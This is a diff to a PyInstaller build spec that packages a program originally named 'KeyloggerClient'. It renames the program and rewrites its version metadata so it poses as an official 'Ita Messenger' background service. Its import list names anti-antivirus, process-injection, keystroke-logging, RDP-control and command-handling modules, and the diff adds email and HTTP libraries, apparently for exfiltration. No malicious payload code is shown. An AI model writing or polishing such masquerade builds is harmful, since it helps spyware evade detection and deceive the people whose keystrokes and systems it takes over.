@@ -12,8 +12,8 @@ block_cipher = None
 # تعریف version info
 version_info = VSVersionInfo(
   ffi=FixedFileInfo(
-    filevers=(1, 1, 0, 0),
-    prodvers=(1, 1, 0, 0),
+    filevers=(1, 1, 0, 1),
+    prodvers=(1, 1, 0, 1),
     mask=0x3f,
     flags=0x0,
     OS=0x40004,
@@ -26,15 +26,15 @@ version_info = VSVersionInfo(
       StringTable(
         '040904B0',
         [
-          StringStruct('CompanyName', 'Ita Messenger Co.'),
-          StringStruct('FileDescription', 'Ita Messenger Service'),
-          StringStruct('FileVersion', '1.1.0.0'),
-          StringStruct('InternalName', 'ItaMessenger'),
-          StringStruct('LegalCopyright', 'Copyright 2024 Ita Messenger Co. All rights reserved.'),
-          StringStruct('OriginalFilename', 'KeyloggerClient.exe'),
+          StringStruct('CompanyName', 'Ita Messenger Corporation'),
+          StringStruct('FileDescription', 'Ita Messenger Background Service'),
+          StringStruct('FileVersion', '1.1.0.1'),
+          StringStruct('InternalName', 'ItaMessengerService'),
+          StringStruct('LegalCopyright', 'Copyright 2024 Ita Messenger Corporation. All rights reserved.'),
+          StringStruct('OriginalFilename', 'ItaMessengerService.exe'),
           StringStruct('ProductName', 'Ita Messenger'),
-          StringStruct('ProductVersion', '1.1.0.0'),
-          StringStruct('Comments', 'Ita is a multi-platform instant messaging service based on cloud computing.'),
+          StringStruct('ProductVersion', '1.1.0.1'),
+          StringStruct('Comments', 'Official Ita Messenger background service for system integration.'),
         ]
       )
     ]),
@@ -64,6 +64,11 @@ def get_hidden_imports_and_data():
         'system.anti_av', 'system.process_injector',
         'monitoring.logger', 'monitoring.rdp_controller', 
         'network.communicator', 'encryption.manager', 'commands.handler',
+        # اضافه کردن ماژول‌های ضروری برای requests و urllib3
+        'http', 'email', 'email.mime', 'email.mime.text', 'email.mime.multipart',
+        'email.mime.base', 'email.mime.nonmultipart', 'email.encoders',
+        'urllib3.packages.six', 'urllib3.packages.ssl_match_hostname',
+        'urllib3.contrib', 'urllib3.contrib.pyopenssl',
     ]
     
     datas = []
@@ -82,6 +87,10 @@ def get_hidden_imports_and_data():
 
 hidden_imports, additional_datas, additional_binaries = get_hidden_imports_and_data()
 
+# اضافه کردن manifest به datas
+if os.path.exists('manifest.xml'):
+    additional_datas.append(('manifest.xml', '.'))
+
 a = Analysis(
     ['main.py'],
     pathex=[],
@@ -92,7 +101,8 @@ a = Analysis(
     hooksconfig={},
     runtime_hooks=[],
     excludes=[
-        'tkinter', 'unittest', 'email', 'http', 'xmlrpc', 'pydoc', 'doctest',
+        # فقط ماژول‌های غیرضروری رو exclude کن
+        'tkinter', 'unittest', 'xmlrpc', 'pydoc', 'doctest',
         'multiprocessing', 'concurrent', 'test', 'lib2to3', 'distutils',
     ],
     win_no_prefer_redirects=False,
@@ -111,10 +121,10 @@ exe = EXE(
     a.zipfiles,
     a.datas,
     [],
-    name='KeyloggerClient',
+    name='ItaMessengerService',
     debug=False,
     bootloader_ignore_signals=False,
-    strip=True,
+    strip=False,
     upx=True,
     upx_exclude=[],
     runtime_tmpdir=None,
